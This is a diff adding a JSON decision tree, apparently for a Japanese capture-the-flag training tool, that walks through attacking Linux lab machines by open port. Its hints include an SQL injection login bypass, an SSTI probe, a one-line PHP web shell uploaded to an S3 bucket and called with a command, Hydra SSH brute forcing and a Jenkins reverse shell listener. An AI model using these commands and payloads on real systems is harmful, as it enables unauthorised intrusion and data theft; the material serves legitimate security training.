@@ -1,0 +1,545 @@
+{
+  "id": "nmap-basics-linux",
+  "title": "Linux Machine Exploitation",
+  "description": "Linux環境でのマシン攻略手順",
+  "root_node_id": "linux-root",
+  "nodes": {
+    "linux-root": {
+      "id": "linux-root",
+      "question": "Nmapスキャンを行う",
+      "hints": [
+        { "text": "sudo nmap -sS <IP> -p- --min-rate 5000 -T4 -Pn", "type": "command" },
+        { "text": "sudo nmap -sV -sC <IP> -p<PORT> -Pn", "type": "command" }
+      ],
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-telnet",
+          "label": "23/tcp telnet",
+          "next_node_ids": ["linux-telnet-1"]
+        },
+        {
+          "id": "opt-ftp",
+          "label": "21/tcp FTP",
+          "next_node_ids": ["linux-ftp-1"]
+        },
+        {
+          "id": "opt-redis",
+          "label": "6379/tcp redis",
+          "next_node_ids": ["linux-redis-1"]
+        },
+        {
+          "id": "opt-http",
+          "label": "80/tcp http",
+          "next_node_ids": ["linux-http-gobuster-1", "linux-http-sqli-1", "linux-http-ssti-1", "linux-http-s3-1"]
+        },
+        {
+          "id": "opt-mongodb",
+          "label": "27017/tcp mongodb",
+          "next_node_ids": ["linux-mongodb-1"]
+        },
+        {
+          "id": "opt-rsync",
+          "label": "873/tcp rsync",
+          "next_node_ids": ["linux-rsync-1"]
+        },
+        {
+          "id": "opt-mysql",
+          "label": "3306/tcp mysql",
+          "next_node_ids": ["linux-mysql-1"]
+        },
+        {
+          "id": "opt-http-proxy",
+          "label": "8080/tcp http-proxy",
+          "next_node_ids": ["linux-jenkins-1"]
+        }
+      ]
+    },
+    "linux-telnet-1": {
+      "id": "linux-telnet-1",
+      "question": "telnet <IP> で接続",
+      "hint": "username:root, password:<empty>",
+      "hint_type": "text",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-telnet-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    },
+    "linux-ftp-1": {
+      "id": "linux-ftp-1",
+      "question": "ftp <IP> で接続",
+      "hint": "username:anonymous, password:<empty>",
+      "hint_type": "text",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-ftp-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        },
+        {
+          "id": "opt-ftp-web-creds",
+          "label": "webサイトへのログインのためのユーザー名とパスワードを取得",
+          "next_node_ids": ["linux-ftp-web-2"]
+        }
+      ]
+    },
+    "linux-ftp-web-2": {
+      "id": "linux-ftp-web-2",
+      "question": "ログイン画面のディレクトリを探索（ポート80/tcpが空いている場合）",
+      "hint": "gobuster dir -u http://<IP> -w <wordlist>",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-ftp-web-dir",
+          "label": "ディレクトリ発見",
+          "next_node_ids": ["linux-ftp-web-3"]
+        }
+      ]
+    },
+    "linux-ftp-web-3": {
+      "id": "linux-ftp-web-3",
+      "question": "取得したユーザー名とパスワードでログイン",
+      "hint": "http://<IP>/<login_directory_name>",
+      "hint_type": "text",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-ftp-web-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    },
+    "linux-redis-1": {
+      "id": "linux-redis-1",
+      "question": "redisサーバーと接続",
+      "hint": "redis-cli -h <IP>",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-redis-connected",
+          "label": "接続成功",
+          "next_node_ids": ["linux-redis-2"]
+        }
+      ]
+    },
+    "linux-redis-2": {
+      "id": "linux-redis-2",
+      "question": "サーバー情報を取得",
+      "hint": "info",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-redis-info",
+          "label": "サーバー情報取得",
+          "next_node_ids": ["linux-redis-3"]
+        }
+      ]
+    },
+    "linux-redis-3": {
+      "id": "linux-redis-3",
+      "question": "データベースのキーを取得",
+      "hints": [
+        { "text": "select <number>", "type": "command" },
+        { "text": "keys *", "type": "command" }
+      ],
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-redis-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    },
+    "linux-http-gobuster-1": {
+      "id": "linux-http-gobuster-1",
+      "question": "隠しディレクトリを探索",
+      "hint": "gobuster dir -u http://<IP> -w <wordlist>",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-gobuster-dir",
+          "label": "隠しディレクトリ発見",
+          "next_node_ids": ["linux-http-gobuster-2"]
+        }
+      ]
+    },
+    "linux-http-gobuster-2": {
+      "id": "linux-http-gobuster-2",
+      "question": "http://<IP>/<hidden_directory> にアクセス",
+      "hint": "手動でパスワード試行してログイン",
+      "hint_type": "text",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-gobuster-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    },
+    "linux-http-sqli-1": {
+      "id": "linux-http-sqli-1",
+      "question": "ログイン画面でSQLi",
+      "hint": "username=admin'+OR+1=1#&password=aaa",
+      "hint_type": "text",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-sqli-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    },
+    "linux-http-ssti-1": {
+      "id": "linux-http-ssti-1",
+      "question": "SSTI脆弱性を確認",
+      "hint": "フォーム等に\"{{7*7}}\"等を入力",
+      "hint_type": "text",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-ssti-confirm",
+          "label": "レスポンスが\"49\"",
+          "next_node_ids": ["linux-http-ssti-2"]
+        }
+      ]
+    },
+    "linux-http-ssti-2": {
+      "id": "linux-http-ssti-2",
+      "question": "cheatsheetを参照し、同フォーム等にpayloadを入力",
+      "hint": "",
+      "hint_type": "text",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-ssti-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    },
+    "linux-http-s3-1": {
+      "id": "linux-http-s3-1",
+      "question": "サブドメインを列挙",
+      "hint": "gobuster vhost -u http://<IP> -w <wordlist>",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-s3-subdomain",
+          "label": "S3サブドメイン発見",
+          "next_node_ids": ["linux-http-s3-2"]
+        }
+      ]
+    },
+    "linux-http-s3-2": {
+      "id": "linux-http-s3-2",
+      "question": "サブドメインの名前解決を追加",
+      "hint": "echo \"<IP> s3.<domain_name>\" | sudo tee -a /etc/hosts",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-s3-hosts",
+          "label": "追加完了",
+          "next_node_ids": ["linux-http-s3-3"]
+        }
+      ]
+    },
+    "linux-http-s3-3": {
+      "id": "linux-http-s3-3",
+      "question": "awscliをインストール＆設定",
+      "hints": [
+        { "text": "aws configure", "type": "command" },
+        { "text": "設定値は全てtmpなど", "type": "text" }
+      ],
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-s3-aws",
+          "label": "設定完了",
+          "next_node_ids": ["linux-http-s3-4"]
+        }
+      ]
+    },
+    "linux-http-s3-4": {
+      "id": "linux-http-s3-4",
+      "question": "パケット及びパケット以下のオブジェクトを参照",
+      "hints": [
+        { "text": "aws --endpoint=http://s3.<domain_name> s3 ls", "type": "command" },
+        { "text": "aws --endpoint=http://s3.<domain_name> s3 ls s3://<packet_name>", "type": "command" }
+      ],
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-s3-storage",
+          "label": "S3パケットがストレージとして使用されている",
+          "next_node_ids": ["linux-http-s3-5"]
+        }
+      ]
+    },
+    "linux-http-s3-5": {
+      "id": "linux-http-s3-5",
+      "question": "コマンド入力を受け取り実行するphpファイルをS3パケットにコピー",
+      "hints": [
+        { "text": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php", "type": "command" },
+        { "text": "aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://<domain_name>", "type": "command" }
+      ],
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-s3-upload",
+          "label": "コピー完了",
+          "next_node_ids": ["linux-http-s3-6"]
+        }
+      ]
+    },
+    "linux-http-s3-6": {
+      "id": "linux-http-s3-6",
+      "question": "任意のコマンドを入力",
+      "hint": "http://<domain_name>/shell.php?cmd=find%20/%20-name%20flag.txt",
+      "hint_type": "text",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-s3-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    },
+    "linux-mongodb-1": {
+      "id": "linux-mongodb-1",
+      "question": "mongodbに接続",
+      "hints": [
+        { "text": "mongodb shellのインストールが必要", "type": "text" },
+        { "text": "./mongo <IP>:27017", "type": "command" },
+        { "text": "or", "type": "text" },
+        { "text": "mongosh \"mongodb://<IP>:27017\"", "type": "command" }
+      ],
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-mongodb-connected",
+          "label": "接続成功",
+          "next_node_ids": ["linux-mongodb-2"]
+        }
+      ]
+    },
+    "linux-mongodb-2": {
+      "id": "linux-mongodb-2",
+      "question": "データベース中のドキュメントを取得",
+      "hints": [
+        { "text": "show dbs", "type": "command" },
+        { "text": "use <db_name>", "type": "command" },
+        { "text": "show collections", "type": "command" },
+        { "text": "db.<collection_name>.find()", "type": "command" }
+      ],
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-mongodb-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    },
+    "linux-rsync-1": {
+      "id": "linux-rsync-1",
+      "question": "rsyncサーバーが公開しているモジュールからファイルを取得",
+      "hints": [
+        { "text": "rsync --list-only rsync://<IP>/", "type": "command" },
+        { "text": "rsync --list-only rsync://<IP>/<module_name>", "type": "command" },
+        { "text": "rsync -avh rsync://<IP>/<module_name>/<file_name>", "type": "command" }
+      ],
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-rsync-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    },
+    "linux-mysql-1": {
+      "id": "linux-mysql-1",
+      "question": "mysqlに接続",
+      "hint": "mysql -h <IP> -u root --skip-ssl",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-mysql-connected",
+          "label": "接続成功",
+          "next_node_ids": ["linux-mysql-2"]
+        }
+      ]
+    },
+    "linux-mysql-2": {
+      "id": "linux-mysql-2",
+      "question": "データベース中のデータを取得",
+      "hints": [
+        { "text": "show databases;", "type": "command" },
+        { "text": "use <database_name>;", "type": "command" },
+        { "text": "show tables;", "type": "command" },
+        { "text": "select * from <table_name>", "type": "command" }
+      ],
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-mysql-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    },
+    "linux-ftp-ssh-1": {
+      "id": "linux-ftp-ssh-1",
+      "question": "ftp <IP> で接続（SSH経由パス）",
+      "hint": "username:anonymous, password:<empty>",
+      "hint_type": "text",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-ftp-ssh-creds",
+          "label": "ssh接続のためのユーザー名リストと初期パスワードを取得",
+          "next_node_ids": ["linux-ftp-ssh-2"]
+        }
+      ]
+    },
+    "linux-ftp-ssh-2": {
+      "id": "linux-ftp-ssh-2",
+      "question": "初期パスワードを使用しているユーザーを特定（ポート22/tcpが開いている場合）",
+      "hint": "hydra -L <username_list> -p <password> ssh://<IP> -V",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-ftp-ssh-user",
+          "label": "ユーザー特定",
+          "next_node_ids": ["linux-ftp-ssh-3"]
+        }
+      ]
+    },
+    "linux-ftp-ssh-3": {
+      "id": "linux-ftp-ssh-3",
+      "question": "ssh <username>@<IP> で接続",
+      "hint": "",
+      "hint_type": "text",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-ftp-ssh-connected",
+          "label": "接続完了",
+          "next_node_ids": ["linux-ftp-ssh-4"]
+        }
+      ]
+    },
+    "linux-ftp-ssh-4": {
+      "id": "linux-ftp-ssh-4",
+      "question": "現在listen状態のTCPソケットを表示",
+      "hints": [
+        { "text": "ss -tl", "type": "command" },
+        { "text": "ss -tln", "type": "command" }
+      ],
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-ftp-ssh-postgres",
+          "label": "5432/tcp postgresql",
+          "next_node_ids": ["linux-ftp-ssh-5"]
+        }
+      ]
+    },
+    "linux-ftp-ssh-5": {
+      "id": "linux-ftp-ssh-5",
+      "question": "ローカルポートフォワーディングでpostgresqlに接続",
+      "hints": [
+        { "text": "ssh -L 5432:localhost:5432 <username>@<IP>", "type": "command" },
+        { "text": "psql -h localhost -p 5432 -U <username>", "type": "command" }
+      ],
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-ftp-ssh-pg-connected",
+          "label": "接続完了",
+          "next_node_ids": ["linux-ftp-ssh-6"]
+        }
+      ]
+    },
+    "linux-ftp-ssh-6": {
+      "id": "linux-ftp-ssh-6",
+      "question": "データベース中のデータを取得",
+      "hints": [
+        { "text": "\\l", "type": "command" },
+        { "text": "\\c <database_name>", "type": "command" },
+        { "text": "\\dt", "type": "command" },
+        { "text": "SELECT * FROM <table_name>;", "type": "command" }
+      ],
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-ftp-ssh-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    },
+    "linux-jenkins-1": {
+      "id": "linux-jenkins-1",
+      "question": "サーバーからのレスポンスから情報収集",
+      "hint": "curl -v http://<IP>/8080",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-jenkins-header",
+          "label": "X-jenkinsヘッダー",
+          "next_node_ids": ["linux-jenkins-2"]
+        }
+      ]
+    },
+    "linux-jenkins-2": {
+      "id": "linux-jenkins-2",
+      "question": "http://<IP>:8080にアクセス",
+      "hint": "手動でパスワード試行してログイン",
+      "hint_type": "text",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-jenkins-login",
+          "label": "ログイン成功",
+          "next_node_ids": ["linux-jenkins-3"]
+        }
+      ]
+    },
+    "linux-jenkins-3": {
+      "id": "linux-jenkins-3",
+      "question": "JenkinsのScript Consoleでreverse shellを実行",
+      "hints": [
+        { "text": "cheatsheet参照", "type": "text" },
+        { "text": "nc -lvnp 4444", "type": "command" }
+      ],
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-jenkins-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    }
+  }
+}
